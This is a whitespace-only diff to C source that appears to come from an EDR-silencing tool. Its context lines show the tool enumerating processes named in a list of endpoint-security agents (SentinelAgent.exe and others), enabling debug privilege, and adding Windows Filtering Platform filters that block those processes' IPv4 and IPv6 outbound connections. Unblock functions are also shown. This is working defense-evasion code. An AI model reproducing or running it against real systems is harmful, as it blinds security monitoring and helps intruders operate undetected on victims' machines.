@@ -21,7 +21,7 @@ char* edrProcess[] = {
     "SentinelAgent.exe",
     "SentinelAgentWorker.exe",
     "SentinelServiceHost.exe",
-    "SentinelStaticEngine.exe",  
+    "SentinelStaticEngine.exe",
     "LogProcessorService.exe",
     "SentinelStaticEngineScanner.exe",
     "SentinelHelperService.exe",
@@ -108,7 +108,7 @@ void BlockEdrProcessTraffic() {
         printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
         return;
     }
-   
+
     EnableSeDebugPrivilege();
 
     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -140,7 +140,7 @@ void BlockEdrProcessTraffic() {
                 FWP_BYTE_BLOB* appId = NULL;
                 UINT64 filterId = 0;
                 ErrorCode errorCode = CUSTOM_SUCCESS;
-                
+
                 QueryFullProcessImageNameW(hProcess, 0, fullPath, &size);
                 errorCode = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
                 if (errorCode != CUSTOM_SUCCESS) {
@@ -165,7 +165,7 @@ void BlockEdrProcessTraffic() {
                     }
                     CloseHandle(hProcess);
                     continue;
-                } 
+                }
 
                 // Sett up WFP filter and condition
                 filter.displayData.name = filterName;
@@ -206,7 +206,7 @@ void BlockEdrProcessTraffic() {
                 } else {
                     printf("    [-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
                 }
-                
+
                 filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
                 result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
                 if (result == ERROR_SUCCESS) {
@@ -244,7 +244,7 @@ void BlockProcessTraffic(char* fullPath) {
     FWP_BYTE_BLOB* appId = NULL;
     UINT64 filterId = 0;
     ErrorCode errorCode = CUSTOM_SUCCESS;
-    
+
     result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
     if (result != ERROR_SUCCESS) {
         printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
@@ -362,7 +362,7 @@ void UnblockAllWfpFilters() {
         if (numFilters == 0) {
 			break;
         }
-        
+
         FWPM_DISPLAY_DATA0 *data = &filters[0]->displayData;
         WCHAR* currentFilterName = data->name;
         if (wcscmp(currentFilterName, filterName) == 0) {
@@ -406,7 +406,7 @@ void UnblockWfpFilter(UINT64 filterId) {
         printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
         return;
     }
-    
+
     result = FwpmFilterDeleteById0(hEngine, filterId);
 
     if (result == ERROR_SUCCESS) {
@@ -455,7 +455,7 @@ int main(int argc, char *argv[]) {
         PrintHelp();
         return 1;
     }
-    
+
     if (!CheckProcessIntegrityLevel()) {
         return 1;
     }
